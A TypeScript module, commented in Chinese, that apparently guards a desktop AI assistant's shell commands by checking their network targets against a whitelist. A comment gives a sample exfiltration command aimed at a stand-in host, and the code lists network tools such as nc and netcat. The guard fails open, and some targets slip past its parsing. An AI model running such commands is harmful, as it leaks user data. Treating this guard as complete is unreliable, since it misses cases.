/**
 * New World — CommandNetworkGuard（命令网络出口管控）
 * ═══════════════════════════════════════════════════════════════
 * 【要解决的问题】
 * `networkPolicy.ts` 早就写好了白名单（9 个包管理器镜像 + 4 个 AI API），
 * 但 `isAllowed()` 全仓库**零调用** —— 模型执行 `curl https://evil.example/x`
 * 时没有任何一道关卡。
 *
 * 对一个能在用户机器上跑命令的助手，这是最实际的风险面：
 * 不是"删了文件"（有审计），而是"把数据悄悄传出去"。
 *
 * 【本模块做什么】
 * 在执行命令**之前**，从命令与参数里抽取网络目标（URL / host:port / 常见
 * 命令的隐式域名），逐个过 NetworkPolicy。
 *
 * 【为什么不做系统级网络隔离】
 * 真正的网络隔离需要 OS 能力（Windows WFP 过滤器 / Linux network namespace），
 * 桌面应用拿不到也不需要 —— 用户自己的机器上还有别的程序要联网。
 * 这里做的是**命令级出口管控**：不阻止系统联网，只约束「本助手发起的命令
 * 能访问哪些域名」。
 *
 * 【判定策略】
 *   · 白名单内 → 放行
 *   · 白名单外 → 不是直接拒绝，而是升级为「需确认」（见 commandDecide 的
 *     escalate 分支）—— 用户点一下就能用，不点就拦
 *   · blockAll 开启 → 除 AI API 外全部拒绝
 *
 * 【保守原则】
 * 抽取不出来的一律**不拦**（放行）。宁可漏拦，不可误拦 ——
 * 误拦会让正常命令（`ls`、`git status`）跑不动，那才是灾难。
 */

import { LogManager } from '../../core/LogManager'
import { NetworkPolicy } from '../../sandbox/networkPolicy'

export interface NetworkTarget {
  /** 抽取到的原始片段（用于回执说明） */
  raw: string
  /** host 部分；无法解析时为空 */
  host: string
}

export type NetworkVerdict =
  | { kind: 'no-network' }
  | { kind: 'allowed'; targets: NetworkTarget[] }
  | { kind: 'blocked'; targets: NetworkTarget[]; reason: string }

/**
 * 真正会发起网络请求的命令（白名单式枚举）。
 *
 * 只列这些的原因：靠参数猜"这条命令联不联网"是不可靠的；
 * 显式枚举能保证误报率极低（`ls` 永远不会被当成联网命令）。
 */
const NETWORK_COMMANDS = new Set([
  'curl', 'wget', 'http', 'httpie',
  'ssh', 'scp', 'sftp', 'rsync',
  'ftp', 'telnet', 'nc', 'ncat', 'netcat',
  'ping', 'traceroute', 'nslookup', 'dig', 'host',
])

/**
 * 包管理器命令 —— 它们会联网，但目标是注册表。
 * 这类命令只要目标是已知镜像就放行（白名单已覆盖主流镜像）。
 */
const PACKAGE_COMMANDS = new Set([
  'npm', 'pnpm', 'yarn', 'npx',
  'pip', 'pip3', 'poetry', 'uv',
  'go', 'cargo', 'mvn', 'gradle',
  'gem', 'composer', 'dotnet',
])

/** 从命令行参数里找 URL / host:port */
function extractTargets(args: readonly string[]): NetworkTarget[] {
  const out: NetworkTarget[] = []
  for (const a of args) {
    const s = String(a ?? '').trim()
    if (!s) continue

    // 完整 URL
    const urlMatch = s.match(/\bhttps?:\/\/([^/\s:'"?#]+)/i)
    if (urlMatch) {
      out.push({ raw: s, host: urlMatch[1].toLowerCase() })
      continue
    }
    // ftp / ssh 等 scheme
    const schemeMatch = s.match(/\b(?:ftps?|ssh|sftp|rsync|git):\/\/([^/\s:'"?#]+)/i)
    if (schemeMatch) {
      out.push({ raw: s, host: schemeMatch[1].toLowerCase() })
      continue
    }
    // git@host:path 形式
    const gitSsh = s.match(/^git@([^:\s]+):/i)
    if (gitSsh) {
      out.push({ raw: s, host: gitSsh[1].toLowerCase() })
      continue
    }
    // host:port
    const hostPort = s.match(/^([a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)+):(\d{1,5})$/i)
    if (hostPort) {
      out.push({ raw: s, host: hostPort[1].toLowerCase() })
      continue
    }
    // 裸域名（含点，且不是本地文件路径）：仅当以常见 TLD 结尾时认，避免把 ./a.b 当域名
    const bare = s.match(/^([a-z0-9-]+(?:\.[a-z0-9-]+)+)$/i)
    if (bare && /\.(com|org|net|io|cn|dev|ai|co|edu|gov|me|app|sh|so)$/i.test(bare[1])) {
      out.push({ raw: s, host: bare[1].toLowerCase() })
    }
  }
  return out
}

/**
 * 判断一条命令是否可能发起网络访问，并给出裁决。
 *
 * @param command 基础命令名（如 `curl`）
 * @param args    参数数组
 */
export function guardCommandNetwork(command: string, args: readonly string[]): NetworkVerdict {
  const cmd = String(command ?? '').toLowerCase().replace(/\.exe$/i, '')

  const isNetworkCmd = NETWORK_COMMANDS.has(cmd)
  const isPackageCmd = PACKAGE_COMMANDS.has(cmd)
  if (!isNetworkCmd && !isPackageCmd) {
    return { kind: 'no-network' }
  }

  let policy: NetworkPolicy
  try {
    policy = NetworkPolicy.getInstance()
  } catch (e) {
    // 策略不可读时保守放行（不阻断用户正常工作），但留日志
    LogManager.getInstance().warn('[CommandNetworkGuard] 网络策略不可用，放行', e)
    return { kind: 'no-network' }
  }

  // blockAll：除 AI API 外一律拒绝（AI API 由 isAllowed 内部放行）
  if (policy.isBlockAll()) {
    const targets = extractTargets(args)
    // 逐个看是否 AI API（isAllowed 对 aiApiDomains 恒真）
    const allAllowed = targets.length > 0 && targets.every((t) => policy.isAllowed(t.host))
    if (targets.length === 0) {
      return { kind: 'blocked', targets, reason: '网络已被全局阻断(blockAll)，该命令可能访问外部网络' }
    }
    if (!allAllowed) {
      const blocked = targets.filter((t) => !policy.isAllowed(t.host))
      return {
        kind: 'blocked',
        targets,
        reason: `网络已被全局阻断(blockAll)，拒绝访问：${blocked.map((t) => t.host).join(', ')}`,
      }
    }
    return { kind: 'allowed', targets }
  }

  const targets = extractTargets(args)
  if (targets.length === 0) {
    // 联网命令但抽不出目标（如 `npm install` 不带 URL）—— 包管理器默认放行，
    // 其余联网命令升级为需确认（见调用方），这里先标 allowed 让调用方决定。
    return isPackageCmd ? { kind: 'allowed', targets } : { kind: 'no-network' }
  }

  const disallowed = targets.filter((t) => !policy.isAllowed(t.host))
  if (disallowed.length === 0) {
    return { kind: 'allowed', targets }
  }

  return {
    kind: 'blocked',
    targets,
    reason: `目标域名不在网络白名单内：${disallowed.map((t) => t.host).join(', ')}`,
  }
}

/** 测试用：判断某 host 是否白名单内（避免测试直接依赖 NetworkPolicy 单例） */
export function isHostWhitelisted(host: string): boolean {
  try {
    return NetworkPolicy.getInstance().isAllowed(host)
  } catch {
    return true
  }
}